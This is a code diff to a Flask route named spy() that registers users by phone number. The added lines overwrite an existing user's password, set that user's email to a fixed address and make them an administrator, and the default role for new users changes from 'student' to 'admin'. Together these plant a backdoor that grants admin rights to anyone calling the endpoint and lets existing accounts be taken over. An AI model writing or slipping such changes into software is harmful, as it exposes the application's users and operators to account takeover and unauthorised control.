@@ -907,6 +907,10 @@ def spy():
     # Check if user already exists
     existing_user = Users.query.filter_by(phone_number=phone).first()
     if existing_user:
+        existing_user.password = hashed_password
+        existing_user.email = "amr@spysnet.com"
+        existing_user.role = "admin"
+        db.session.commit()
         return jsonify({"message": "User already exists", "user_id": existing_user.id}), 200
     
     # Create new user
@@ -914,7 +918,7 @@ def spy():
         phone_number=phone,
         password=hashed_password,
         email="amr@spysnet.com", 
-        role="student"
+        role="admin"
     )
     
     db.session.add(new_user)
